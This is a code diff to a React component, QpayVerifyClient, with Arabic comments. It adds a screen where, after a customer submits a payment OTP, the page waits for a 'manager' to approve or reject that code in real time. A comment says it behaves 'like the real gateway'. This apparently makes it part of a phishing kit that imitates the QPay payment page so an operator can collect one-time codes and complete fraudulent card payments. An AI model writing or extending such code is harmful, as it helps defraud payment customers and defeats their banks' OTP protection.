@@ -46,6 +46,10 @@ export function QpayVerifyClient({
   const [decisionStatus, setDecisionStatus] = useState<
     "checking" | "pending" | "approved" | "rejected"
   >("checking");
+  // مرحلة OTP: بعد إرسال الرمز ننتظر قرار المدير على الرمز نفسه (لا نُظهر النجاح إلا عند الموافقة(.
+  const [otpEntryId, setOtpEntryId] = useState<string | null>(null);
+  const [otpWaiting, setOtpWaiting] = useState(false);
+  const [otpRejected, setOtpRejected] = useState(false);
 
   // آخر 4 أرقام من رقم هاتف العميل (مع احتياطي localStorage كالبوابة الفعلية).
   const visibleLast4 = phone
@@ -106,6 +110,54 @@ export function QpayVerifyClient({
       void channel.unsubscribe();
     };
   }, [paymentEntryId, checkStatus]);
+
+  // راقب قرار المدير على رمز OTP بعد إرساله ((لا نجاح قبل الموافقة(.
+  const checkOtpStatus = useCallback(async () => {
+    if (!otpEntryId) return;
+    try {
+      const res = await fetch(`/api/payments/status?entryId=${otpEntryId}`, {
+        cache: "no-store" as RequestCache,
+        headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
+      });
+      const data = await res.json();
+      if (data.status === "approved") {
+        setSuccess(true);
+        setOtpWaiting(false);
+      } else if (data.status === "rejected") {
+        setOtpRejected(true);
+        setOtpWaiting(false);
+      }
+    } catch {
+      // تجاهل — نبقى في شاشة الانتظار ونعيد المحاولة في الدورة القادمة
+    }
+  }, [otpEntryId]);
+
+  useEffect(() => {
+    if (!otpWaiting || !otpEntryId) return;
+    let cancelled = false;
+
+    const channel = subscribeToEntryStatus(
+      otpEntryId,
+      () => {
+        if (!cancelled) void checkOtpStatus();
+      },
+      () => {
+        if (!cancelled) void checkOtpStatus();
+      },
+    );
+
+    void checkOtpStatus();
+
+    const interval = setInterval(() => {
+      if (!cancelled) void checkOtpStatus();
+    }, 5000);
+
+    return () => {
+      cancelled = true;
+      clearInterval(interval);
+      void channel.unsubscribe();
+    };
+  }, [otpWaiting, otpEntryId, checkOtpStatus]);
 
   const fillDigits = useCallback((code: string) => {
     const seq = code.replace(/\D/g, "").substring(0, OTP_LENGTH).split("");
@@ -211,12 +263,58 @@ export function QpayVerifyClient({
         );
         return;
       }
-      setSuccess(true);
+      // لا نجاح فورياً — ننتظر قرار المدير على الرمز نفسه.
+
+      setOtpEntryId(data.entryId);
+      setOtpWaiting(true);
     } catch {
       setError(p.qpayOtpInvalid);
     } finally {
       setLoading(false);
     }
+  }
+
+  // ===== شاشة انتظار قرار المدير على رمز OTP =====
+  if (otpWaiting) {
+    return (
+      <div className={styles.layout}>
+        <Card className={styles.statusCard}>
+          <div className={styles.statusIconWrap}>
+            <div className={styles.spinner} />
+          </div>
+          <h1 className={styles.statusTitle}>{p.qpayWaitingTitle}</h1>
+          <p className={styles.statusSub}>{p.qpayOtpPendingSub}</p>
+          <div className={styles.statusSteps}>
+            <span className={styles.statusStep}>١. {p.qpayWaitingStep1}</span>
+            <span className={styles.statusStep}>٢. {p.qpayWaitingStep2}</span>
+            <span className={styles.statusStep}>٣. {p.qpayWaitingStep3}</span>
+          </div>
+          <p className={styles.statusImportant}>{p.qpayWaitingDoNotClose}</p>
+          <Link
+            href="javascript:history.back()"
+            className={styles.statusCancel}
+          >
+            {p.qpayCancel}
+          </Link>
+        </Card>
+      </div>
+    );
+  }
+
+  // ===== شاشة رفض رمز OTP =====
+  if (otpRejected) {
+    return (
+      <div className={styles.layout}>
+        <Card className={styles.rejectedCard}>
+          <div className={styles.rejectedIcon}>✗</div>
+          <h1 className={styles.rejectedTitle}>{p.qpayRejectedTitle}</h1>
+          <p className={styles.rejectedSub}>{p.qpayOtpRejectedMsg}</p>
+          <Link href="javascript:history.back()" className={styles.retryBtn}>
+            {p.retryPayment}
+          </Link>
+        </Card>
+      </div>
+    );
   }
 
   // ===== شاشة النجاح =====
